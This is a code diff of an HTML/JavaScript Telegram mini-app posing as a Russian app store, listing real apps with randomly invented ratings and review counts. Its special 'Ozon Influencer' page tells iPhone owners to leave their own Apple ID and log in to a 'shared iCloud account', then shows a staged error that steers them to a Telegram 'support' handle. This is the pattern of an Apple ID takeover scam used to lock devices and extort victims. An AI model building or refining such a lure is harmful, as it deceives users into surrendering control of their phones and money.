@@ -18,7 +18,6 @@
             --green: #34C759;
             --red: #FF3B30;
             --warning-bg: rgba(255, 59, 48, 0.08);
-            --apple-bg: rgba(0, 95, 249, 0.06);
         }
 
         * { box-sizing: border-box; margin: 0; padding: 0; user-select: none; -webkit-tap-highlight-color: transparent; }
@@ -31,7 +30,6 @@
             overflow-y: scroll;
         }
 
-        /* Нижняя навигация */
         .bottom-nav {
             position: fixed; bottom: 0; width: 100%; height: 60px;
             background-color: var(--card-bg); display: flex;
@@ -42,12 +40,10 @@
         .nav-item.active { color: var(--primary-blue); }
         .nav-item .material-icons { font-size: 24px; margin-bottom: 2px; }
 
-        /* Экраны */
         .screen { display: none; padding: 16px; animation: fadeIn 0.2s ease-out; }
         .screen.active { display: block; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
 
-        /* Поиск */
         .search-container {
             position: sticky; top: 0; background: var(--bg-color); z-index: 100;
             padding-bottom: 12px; margin-bottom: 4px;
@@ -74,7 +70,6 @@
         }
         .chip.active { background: rgba(0, 95, 249, 0.1); border-color: var(--primary-blue); color: var(--primary-blue); font-weight: 500; }
 
-        /* Карточки приложений */
         .app-list { display: flex; flex-direction: column; gap: 12px; }
         .app-card {
             display: flex; background: var(--card-bg); border-radius: 16px;
@@ -82,7 +77,7 @@
             content-visibility: auto; contain-intrinsic-size: 80px;
         }
         .app-card:active { transform: scale(0.98); }
-        .app-icon { width: 56px; height: 56px; border-radius: 14px; object-fit: cover; background: #2c2c2e; flex-shrink: 0; }
+        .app-icon { width: 56px; height: 56px; border-radius: 14px; object-fit: cover; flex-shrink: 0; }
         .app-info { margin-left: 14px; flex: 1; min-width: 0; }
         .app-name { font-size: 16px; font-weight: 600; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
         .app-category { font-size: 12px; color: var(--hint-color); margin-top: 2px; }
@@ -90,7 +85,7 @@
         .app-rating .material-icons { font-size: 14px; color: var(--star-color); }
         .btn-install { background: var(--primary-blue); color: var(--button-text); border: none; border-radius: 20px; padding: 6px 16px; font-weight: 600; font-size: 13px; }
 
-        /* ===== ДЕТАЛЬНАЯ СТРАНИЦА (OZON INFLUENCER) ===== */
+        /* Детальная страница (общее) */
         .detail-header { display: flex; gap: 16px; margin-bottom: 20px; }
         .detail-icon { width: 84px; height: 84px; border-radius: 20px; }
         .detail-name { font-size: 22px; font-weight: bold; }
@@ -107,7 +102,7 @@
 
         .desc-text { font-size: 14px; line-height: 1.6; color: var(--hint-color); margin-bottom: 24px; }
 
-        /* Блок Apple ID */
+        /* Apple ID блок */
         .apple-block {
             background: var(--card-bg); border-radius: 16px; padding: 18px;
             margin-bottom: 16px;
@@ -137,7 +132,6 @@
             padding: 12px; font-size: 15px; font-weight: 600;
         }
 
-        /* Инструкция (аккордеон) */
         .accordion-content {
             max-height: 0; overflow: hidden;
             transition: max-height 0.35s ease, opacity 0.25s ease, padding 0.3s ease;
@@ -164,7 +158,6 @@
         }
         .steps-list li span { flex: 1; padding-top: 3px; }
 
-        /* Блок ошибки */
         .error-block {
             background: var(--warning-bg); border: 1px solid rgba(255, 59, 48, 0.2);
             border-radius: 16px; padding: 18px; margin-bottom: 16px;
@@ -236,16 +229,47 @@
             document.documentElement.style.setProperty('--card-bg', tg.themeParams.secondary_bg_color || '#1c1c1e');
         }
 
-        // --- ДАННЫЕ: 101 ПРИЛОЖЕНИЕ ---
-        const realIcons = {
-            "VK": "https://upload.wikimedia.org/wikipedia/commons/f/f3/VK_Compact_Logo_%282021-present%29.svg",
-            "СберБанк Онлайн": "https://upload.wikimedia.org/wikipedia/commons/7/7b/Sberbank_Logo_2020.svg",
+        // === РЕАЛЬНЫЕ ИКОНКИ (Wikimedia + другие источники) ===
+        const iconMap = {
+            "VK": "https://upload.wikimedia.org/wikipedia/commons/2/2f/VK_Full_Logo.svg",
             "Telegram": "https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg",
+            "СберБанк Онлайн": "https://upload.wikimedia.org/wikipedia/commons/7/7b/Sberbank_Logo_2020.svg",
             "Авито": "https://upload.wikimedia.org/wikipedia/commons/1/15/Avito_logo.svg",
             "Госуслуги": "https://upload.wikimedia.org/wikipedia/commons/9/91/Gosuslugi_logo.svg",
-            "Wildberries": "https://upload.wikimedia.org/wikipedia/commons/6/6b/Wildberries_logo.svg"
+            "Wildberries": "https://upload.wikimedia.org/wikipedia/commons/6/6b/Wildberries_logo.svg",
+            "Яндекс Маркет": "https://upload.wikimedia.org/wikipedia/commons/4/4e/Yandex_logo.svg",
+            "Яндекс Карты": "https://upload.wikimedia.org/wikipedia/commons/4/4e/Yandex_logo.svg",
+            "Яндекс Навигатор": "https://upload.wikimedia.org/wikipedia/commons/4/4e/Yandex_logo.svg",
+            "Яндекс Go": "https://upload.wikimedia.org/wikipedia/commons/4/4e/Yandex_logo.svg",
+            "Яндекс Браузер": "https://upload.wikimedia.org/wikipedia/commons/4/4e/Yandex_logo.svg",
+            "Яндекс Музыка": "https://upload.wikimedia.org/wikipedia/commons/4/4e/Yandex_logo.svg",
+            "Яндекс Еда": "https://upload.wikimedia.org/wikipedia/commons/4/4e/Yandex_logo.svg",
+            "2ГИС": "https://upload.wikimedia.org/wikipedia/commons/6/66/2GIS_logo.svg"
         };
 
+        // === ЦВЕТА ДЛЯ АВАТАРОК (по категориям) ===
+        const categoryColors = {
+            "Соцсети": "2268FF",
+            "Финансы": "00A86B",
+            "Покупки": "FF6B35",
+            "Развлечения": "9B59B6",
+            "Транспорт": "3498DB",
+            "Инструменты": "7F8C8D",
+            "Госуслуги": "E74C3C",
+            "Еда": "E67E22",
+            "Здоровье": "2ECC71",
+            "Игры": "E74C3C"
+        };
+
+        // Функция генерации иконки-аватара через UI Avatars
+        function getIcon(name, category) {
+            if (iconMap[name]) return iconMap[name];
+            const color = categoryColors[category] || "005FF9";
+            const initials = name.split(' ').slice(0,2).map(w => w[0]).join('').toUpperCase();
+            return `https://ui-avatars.com/api/?name=${encodeURIComponent(initials || name[0])}&background=${color}&color=fff&size=80&bold=true&font-size=0.35`;
+        }
+
+        // === ДАННЫЕ: 101 ПРИЛОЖЕНИЕ ===
         const rawData = {
             "Соцсети":     ["VK", "Telegram", "Одноклассники", "Дзен", "VK Знакомства", "ДругВокруг", "TenChat", "WhatsApp", "Viber", "Discord"],
             "Финансы":     ["СберБанк Онлайн", "Т-Банк", "Альфа-Банк", "ВТБ Онлайн", "Газпромбанк", "ПСБ", "Росбанк", "Совкомбанк", "Райффайзен", "МТС Банк"],
@@ -261,27 +285,29 @@
 
         const categories = ["Все", ...Object.keys(rawData)];
         const apps = [];
-        let id = 1;
+        let appId = 1;
 
         for (const [cat, names] of Object.entries(rawData)) {
             names.forEach(name => {
                 apps.push({
-                    id: id++,
+                    id: appId++,
                     name,
                     category: cat,
                     rating: (Math.random() * (5.0 - 4.2) + 4.2).toFixed(1),
                     reviews: Math.floor(Math.random() * 900 + 100) + "K",
                     size: Math.floor(Math.random() * 200 + 30) + " МБ",
-                    icon: realIcons[name] || `https://picsum.photos/seed/${encodeURIComponent(name)}/80/80`,
+                    icon: getIcon(name, cat),
                     description: name === "Ozon Influencer" 
                         ? "Приложение для блогеров и их работников, зарабатывай вместе с лучшей компанией Ozon."
                         : `Приложение «${name}» — ведущий сервис в категории «${cat}». Установите и пользуйтесь прямо сейчас!`,
-                    screenshots: [1,2,3].map(i => `https://picsum.photos/seed/${encodeURIComponent(name)}_s${i}/130/230`)
+                    screenshots: name === "Ozon Influencer" 
+                        ? []
+                        : [1,2,3].map(i => `https://picsum.photos/seed/${encodeURIComponent(name)}_s${i}/130/230`)
                 });
             });
         }
 
-        // --- СОСТОЯНИЕ ---
+        // === ЛОГИКА ===
         let currentCategory = "Все";
         let searchQuery = "";
         let searchTimeout;
@@ -320,7 +346,8 @@
             }
             container.innerHTML = filtered.map(app => `
                 <div class="app-card" onclick="openDetail(${app.id})">
-                    <img src="${app.icon}" class="app-icon" loading="lazy" alt="${app.name}">
+                    <img src="${app.icon}" class="app-icon" loading="lazy" alt="${app.name}" 
+                         onerror="this.src='https://ui-avatars.com/api/?name=${encodeURIComponent(app.name[0])}&background=005FF9&color=fff&size=80'">
                     <div class="app-info">
                         <div class="app-name">${app.name}</div>
                         <div class="app-category">${app.category} · ${app.size}</div>
@@ -336,10 +363,8 @@
             const app = apps.find(a => a.id === id);
             const content = document.getElementById('detail-content');
 
-            // ОСОБАЯ СТРАНИЦА ДЛЯ OZON INFLUENCER
             if (app.name === "Ozon Influencer") {
                 content.innerHTML = `
-                    <!-- Хедер -->
                     <div class="detail-header">
                         <img src="${app.icon}" class="detail-icon" alt="${app.name}">
                         <div>
@@ -351,18 +376,11 @@
                             </div>
                         </div>
                     </div>
-
-                    <!-- Кнопка Скачать -->
                     <button class="btn-download" onclick="installApp('${app.name}')">📲 Скачать</button>
-
-                    <!-- Описание -->
                     <div class="desc-text">${app.description}</div>
-
-                    <!-- БЛОК: Временный вход в Apple ID -->
                     <div class="apple-block">
                         <h3>🍏 Временный вход в Apple ID</h3>
                         <p>Для установки данного приложения на ваш iPhone необходимо выполнить временный вход в наш общий аккаунт iCloud (Apple ID).</p>
-                        
                         <div class="benefits">
                             <div class="benefit-item">
                                 <div class="benefit-icon"><span class="material-icons">timer</span></div>
@@ -386,13 +404,10 @@
                                 </div>
                             </div>
                         </div>
-
                         <button class="btn-outline" onclick="toggleAccordion()">
                             <span id="accordionBtnText">📖 Инструкция как выйти</span>
                         </button>
                     </div>
-
-                    <!-- БЛОК: Инструкция (аккордеон) -->
                     <div class="accordion-content" id="accordionContent">
                         <ol class="steps-list">
                             <li><span>Откройте приложение «Настройки» на вашем iPhone</span></li>
@@ -403,30 +418,21 @@
                             <li><span>После выхода нажмите кнопку «Подготовить аккаунт» ниже и введите данные нового аккаунта. У вас будет 10 минут для входа.</span></li>
                         </ol>
                     </div>
-
-                    <!-- Разделитель -->
                     <div class="section-divider"></div>
-
-                    <!-- БЛОК: Подготовка к установке -->
                     <div class="error-block">
                         <div class="error-icon">❗</div>
                         <h3 style="font-size:17px;font-weight:700;margin-bottom:8px;">Подготовка к установке</h3>
                         <p>Произошёл сбой. Обратитесь в техническую поддержку — мы поможем решить проблему в ближайшее время.</p>
                     </div>
-
-                    <!-- Чекбокс -->
                     <div class="checkbox-wrap" onclick="document.getElementById('supportCheckbox').click()">
                         <input type="checkbox" id="supportCheckbox">
                         <label for="supportCheckbox">Написать в поддержку</label>
                     </div>
-
-                    <!-- Кнопка поддержки -->
                     <button class="btn-support" onclick="openSupport()">
                         <span class="material-icons">support_agent</span> @RuStoreOzon
                     </button>
                 `;
             } else {
-                // СТАНДАРТНАЯ СТРАНИЦА ДЛЯ ОСТАЛЬНЫХ
                 content.innerHTML = `
                     <div class="detail-header">
                         <img src="${app.icon}" class="detail-icon" alt="${app.name}">
